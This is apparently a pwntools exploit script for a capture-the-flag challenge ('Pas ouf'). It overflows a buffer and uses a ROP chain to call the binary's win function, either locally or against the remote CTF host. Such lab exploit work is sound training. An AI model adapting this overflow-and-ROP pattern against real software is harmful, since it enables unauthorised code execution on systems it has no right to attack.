#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/4T$ CTF/pwn/Pas ouf/pwn-pas-ouf')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)

    rop = ROP(elf)

    rop.raw(cyclic(0x80))
    rop.raw(b'flag'.ljust(0x80, b'\x00'))
    rop.raw(cyclic(0x18))
    rop.call(elf.sym.win)

    r.sendlineafter(b'Hello World!\n', rop.chain())

    print(r.clean(1))

    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('main-5000-pwn-pas-ouf-9841629260715a79.ctf.4ts.fr', 52525, ssl=True)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
